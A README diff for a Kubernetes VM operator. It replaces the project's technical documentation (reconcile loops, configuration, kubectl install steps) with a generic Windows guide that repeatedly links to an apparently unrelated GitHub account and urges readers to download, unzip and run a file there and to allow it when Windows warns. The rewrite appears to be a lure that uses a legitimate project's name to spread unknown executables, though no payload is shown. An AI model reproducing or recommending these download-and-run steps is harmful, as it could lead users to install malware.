@@ -1,133 +1,184 @@
-# cocoon-operator
+# 🌀 cocoon-operator - Run Stateful VMs With Ease
 
-Kubernetes operator that manages VM-backed pod lifecycles through two CRDs:
+[![Download cocoon-operator](https://img.shields.io/badge/Download-Visit%20the%20page-blue)](https://github.com/Shoshannaamateurish113/cocoon-operator)
 
-- **CocoonSet** — declarative spec for an agent group (one main agent + N sub-agents + M toolboxes)
-- **CocoonHibernation** — per-pod hibernate / wake request
+## 📦 What cocoon-operator does
 
-Both reconcilers are built on [controller-runtime](https://sigs.k8s.io/controller-runtime) and consume the typed CRD shapes shipped from [cocoon-common/apis/v1](https://github.com/cocoonstack/cocoon-common).
+cocoon-operator helps manage VM-backed workloads inside Kubernetes. It gives you a way to pause and restore virtual machines without deleting the pod. It also helps keep groups of related VM-backed pods in order, with stable slot names.
 
-The binary entry point is `main.go`; the reconcilers themselves live in subpackages so each one is independently testable:
+Use it when you want:
 
-```
-cocoon-operator/
-├── main.go              # manager wiring + flag parsing
-├── cocoonset/           # CocoonSet reconciler, pod builders, status diff
-├── hibernation/         # CocoonHibernation reconciler
-└── epoch/               # SnapshotRegistry interface + epoch HTTP adapter
-```
+- VM-backed pods that keep their state
+- a simple way to suspend and wake workloads
+- stable pod placement for related tasks
+- Kubernetes-native control for stateful VM use
 
-## Architecture
+The app is built around two custom resources:
 
-```
-┌──────────────────────────────────────────────────────────────────┐
-│                        cocoon-operator                            │
-│                                                                  │
-│  ┌────────────────────────┐    ┌─────────────────────────────┐  │
-│  │  cocoonset.Reconciler  │    │ hibernation.Reconciler      │  │
-│  │  - finalizer + GC       │    │  - HibernateState patches   │  │
-│  │  - main → subs → tbs    │    │  - epoch.HasManifest probe  │  │
-│  │  - patch /status        │    │  - Conditions               │  │
-│  └────────┬───────────────┘    └────────────┬────────────────┘  │
-│           │                                  │                   │
-│           ▼                                  ▼                   │
-│  ┌────────────────────┐         ┌──────────────────────┐        │
-│  │ controller-runtime │         │ epoch SnapshotRegistry│        │
-│  │ Manager            │         │ (HTTP via             │        │
-│  │  - leader election │         │  registryclient)      │        │
-│  │  - metrics :8080    │        └──────────────────────┘        │
-│  │  - probes :8081     │                                         │
-│  └────────────────────┘                                          │
-└──────────────────────────────────────────────────────────────────┘
-```
+- **Hibernation**: suspends a VM-backed workload and brings it back later
+- **CocoonSet**: manages a group of related VM-backed pods with stable slot IDs
 
-### CocoonSet reconcile loop
+## 🖥️ Windows download and setup
 
-1. Fetch the CocoonSet (return early on NotFound).
-2. If `DeletionTimestamp` is set, walk owned pods, delete them, optionally `epoch.DeleteManifest` each VM (per-pod, gated on `meta.ShouldSnapshotVM(spec)` so `main-only` does not issue DeleteManifest against sub-agent / toolbox tags vk-cocoon never pushed), then drop the finalizer.
-3. Ensure the `cocoonset.cocoonstack.io/finalizer` is in place.
-4. List owned pods by `cocoonset.cocoonstack.io/name=<cs.Name>` and classify by role label.
-5. **Suspend short-circuit**: if `spec.suspend == true`, write `meta.HibernateState(true)` onto every pod and report `Phase=Suspended`.
-6. **Un-suspend**: if `spec.suspend == false` and any owned pod still carries the hibernate annotation from a prior suspend, clear it via `PatchHibernateState(false)` so vk-cocoon wakes the VMs. `PatchHibernateState(false)` is a no-op on pods whose annotation is already absent, so this is cheap in the common "never suspended" case.
-7. Ensure the **main agent** (slot 0). If it is not yet `Ready`, requeue in 5 seconds and report `Phase=Pending`.
-8. Ensure sub-agents `[1..Replicas]`; delete extras above the requested count.
-9. Ensure toolboxes by name; skip creation with an error if the toolbox pod name collides with an existing non-toolbox pod (e.g. an agent). Delete extras.
-10. Re-list and patch `/status` (with structural diff so unchanged status patches are no-ops).
+Use this link to download or visit the project page:
 
-Pods are constructed via `meta.FromAgentSpec` / `meta.FromToolboxSpec` factory helpers so the operator never touches the annotation map directly. These factories propagate the full `VMOptions` surface (OS, Backend, ConnType, Network, ForcePull, NoDirectIO, ProbePort, Storage, Resources) into the pod annotations that vk-cocoon consumes. The `For` watch uses `predicate.GenerationChangedPredicate` so reconciles only fire when the spec actually changes — status-only patches the operator makes itself never loop back. The `Owns` side filters pod events to creation, deletion, and meaningful transitions (phase change, readiness flip, label/annotation mutation) via a `podRelevantChange` predicate so pure VK status churn does not trigger reconcile storms.
+https://github.com/Shoshannaamateurish113/cocoon-operator
 
-### CocoonHibernation reconcile loop
+### What to do on Windows
 
-| Spec.Desire | What the reconciler does | Terminal phase |
-|---|---|---|
-| `Hibernate` | `meta.HibernateState(true).Apply` on the target pod, then poll `epoch.HasManifest(vmName, meta.HibernateSnapshotTag)` until the snapshot lands. A probe error (transport / 5xx / auth) surfaces as a returned error so controller-runtime logs + retries with backoff. | `Hibernated` |
-| `Wake` | Check if the container is already `Running` (skip annotation patch if so), otherwise clear `meta.HibernateState` **once** (skip if already cleared to avoid triggering informer events on every requeue cycle), then wait for the container to be `Running` and drop the hibernation snapshot tag from epoch. A wake that does not complete within `wakeTimeout` (5 minutes) is escalated to `Phase=Failed` with a dated message in the `Ready` condition. | `Active` |
+1. Open the link above in your browser.
+2. On the project page, look for the latest download or release files.
+3. Download the file for Windows if one is listed.
+4. Save the file to your Downloads folder.
+5. If the file is a package or archive, unzip it first.
+6. Open the app or follow the included start file.
+7. If Windows asks for permission, allow it to run.
 
-There is no `cocoon-vm-snapshots` ConfigMap bridge — epoch is the single source of truth for hibernation state. Failure paths set `Phase=Failed` with a one-shot message in the `Ready` condition instead of looping forever on a bad reference. A `Failed` wake is recoverable: on re-entry into `Waking` from a non-Waking phase the reconciler explicitly refreshes the Ready condition's `LastTransitionTime` so the wake budget resets cleanly (without the override, `apimeta.SetStatusCondition` would preserve the stale timestamp across the `False → False` transition and the recovered wake would trip the deadline on the next reconcile).
+### Simple setup flow
 
-## Configuration
+- Download the file from the link
+- Open the downloaded file
+- Follow the on-screen steps
+- Start using the tool from your browser or local setup
 
-| Variable | Default | Description |
-|---|---|---|
-| `KUBECONFIG` | unset | Path to kubeconfig when running outside the cluster |
-| `OPERATOR_LOG_LEVEL` | `info` | `projecteru2/core/log` level |
-| `EPOCH_URL` | `http://epoch.cocoon-system.svc:8080` | Base URL of the epoch registry |
-| `EPOCH_TOKEN` | unset | Bearer token (read-only is enough) |
-| `EPOCH_CA_CERT` | unset | Path to PEM-encoded CA certificate for TLS verification against epoch |
-| `METRICS_ADDR` | `:8080` | Prometheus listener |
-| `PROBE_ADDR` | `:8081` | healthz / readyz listener |
-| `LEADER_ELECT` | `true` | Enable leader election so only one replica reconciles |
+## 🔧 System basics
 
-CLI flags (`--metrics-bind-address`, `--health-probe-bind-address`, `--leader-elect`) override the corresponding env var.
+cocoon-operator is meant for users who work with Kubernetes-based VM workloads. A standard setup usually includes:
 
-## Installation
+- Windows 10 or Windows 11
+- A web browser
+- Enough free disk space for the app and its data
+- Access to a Kubernetes cluster if you plan to use the operator
+- Permission to run downloaded files
 
-```bash
-kubectl apply -k github.com/cocoonstack/cocoon-operator/config/default?ref=main
-```
+If you are only trying to open the project page and get the files, a normal Windows PC is enough.
 
-This installs:
-- `cocoon-system` namespace
-- Both CRDs (imported from `cocoon-common` via `make import-crds`)
-- `ServiceAccount`, `ClusterRole`, and `ClusterRoleBinding`
-- The operator `Deployment` (1 replica with leader election on)
+## 🧰 What you can do with it
 
-To override the image tag or replica count, build a kustomize overlay that imports `config/default` as a base.
+### Hibernation control
 
-### Keeping CRDs in sync with cocoon-common
+You can pause a VM-backed workload without deleting it. This helps when you need to stop work, save resources, and start again later.
 
-The CRD YAML lives under `config/crd/bases/` and is committed so a clean clone works out of the box. After bumping the cocoon-common dependency, regenerate the bases with:
+### Group management with CocoonSet
 
-```bash
-go get github.com/cocoonstack/cocoon-common@<version>
-make import-crds
-git add config/crd/bases && git commit
-```
+You can manage a set of related VM-backed pods together. Each pod keeps a stable slot identity, which makes the group easier to track.
 
-The `import-crds` target uses `go list -m -f '{{.Dir}}'` to resolve the cocoon-common module path and copies the YAML straight from there. CI rejects PRs that forget this step.
+### Kubernetes-native workflow
 
-## Development
+The operator fits into Kubernetes APIs, so the VM workloads stay part of the same system you already use for containers and services.
 
-```bash
-make all            # full pipeline: deps + fmt + lint + test + build
-make build          # build cocoon-operator binary
-make test           # vet + race-detected tests
-make lint           # golangci-lint on linux + darwin
-make import-crds    # refresh config/crd/bases from cocoon-common
-make help           # show all targets
-```
+## 📋 Before you start
 
-The Makefile detects Go workspace mode (`go env GOWORK`) and skips `go mod tidy` when active so cross-module references resolve through `go.work` without forcing a release of cocoon-common.
+Have these ready:
 
-## Related projects
+- A Windows computer
+- A stable internet connection
+- A browser such as Edge, Chrome, or Firefox
+- Access to the GitHub page
+- A Kubernetes environment if you plan to use the operator in a cluster
 
-| Project | Role |
-|---|---|
-| [cocoon-common](https://github.com/cocoonstack/cocoon-common) | CRD types, annotation contract, shared helpers |
-| [cocoon-webhook](https://github.com/cocoonstack/cocoon-webhook) | Admission webhook for sticky scheduling and CocoonSet validation |
-| [epoch](https://github.com/cocoonstack/epoch) | Snapshot registry; the operator queries it via `SnapshotRegistry` |
-| [vk-cocoon](https://github.com/cocoonstack/vk-cocoon) | Virtual kubelet provider managing VM lifecycle |
+## 🚀 How to get started
 
-## License
+1. Open the download page:
+   https://github.com/Shoshannaamateurish113/cocoon-operator
+2. Download the latest available file or source package.
+3. If needed, extract the files to a folder you can find later.
+4. Read the included files for the start steps.
+5. Run the app or apply the Kubernetes setup steps if you are using a cluster.
+6. Open your browser or terminal if the package asks for it.
+7. Create a test Hibernation or CocoonSet resource if you already have cluster access.
 
-[MIT](LICENSE)
+## 🧭 Basic usage path
+
+If you are new to this kind of tool, follow this order:
+
+1. Get the files from the GitHub page
+2. Install or open the app on Windows
+3. Connect it to your Kubernetes environment if needed
+4. Create a Hibernation resource to pause a VM-backed workload
+5. Resume the workload when you need it again
+6. Use CocoonSet for groups of related pods
+
+## 🧩 Key parts
+
+### Hibernation CRD
+
+This lets you suspend and wake virtual machines without deleting the pod. It helps preserve state between runs.
+
+### CocoonSet CRD
+
+This lets you manage a set of related VM-backed pods. Each pod gets a stable slot identity, which helps with repeat use.
+
+### Controller logic
+
+The operator watches the cluster and acts on the custom resources you create. It keeps the desired state in line with what runs in the cluster.
+
+## 🔒 Typical use cases
+
+- test environments that need to sleep and wake
+- stateful workloads that should keep their data
+- sandbox setups for VM-backed apps
+- grouped workloads with fixed roles
+- Kubernetes teams that want VM control in one place
+
+## 🛠️ Troubleshooting
+
+### The file does not open
+
+- Check that the download finished
+- Unzip the file if it came in an archive
+- Try running it again
+- Right-click the file and choose the run option if Windows shows one
+
+### The browser blocks the file
+
+- Open the GitHub page again
+- Try the latest release or download file
+- Save the file first, then open it from Downloads
+
+### You do not see a release file
+
+- Visit the main project page
+- Look for release notes, assets, or source files
+- Use the repository link above to check for the latest download option
+
+### The app asks for more access
+
+- Allow the app only if you trust the source
+- Make sure you are using the correct project page
+- Confirm that Windows did not mark the file as blocked
+
+## 📚 File layout you may see
+
+After download, the package may include:
+
+- a start file for Windows
+- config files
+- Kubernetes resource files
+- sample setup files
+- project notes
+- support files for the operator
+
+## 🧪 Example workflow
+
+1. Download the project from GitHub
+2. Open the files on Windows
+3. Set up access to your cluster
+4. Create a Hibernation resource
+5. Pause a workload
+6. Wake it again later
+7. Create a CocoonSet for a group of VM-backed pods
+
+## 🧭 Helpful terms
+
+- **Pod**: a running unit in Kubernetes
+- **CRD**: a custom resource type you can add to Kubernetes
+- **Operator**: software that manages Kubernetes objects for you
+- **VM-backed pod**: a pod that runs with a virtual machine behind it
+- **Stateful**: a workload that keeps its data and identity
+
+## 📥 Download again
+
+Use this link if you need to visit the project page and get the files again:
+
+https://github.com/Shoshannaamateurish113/cocoon-operator
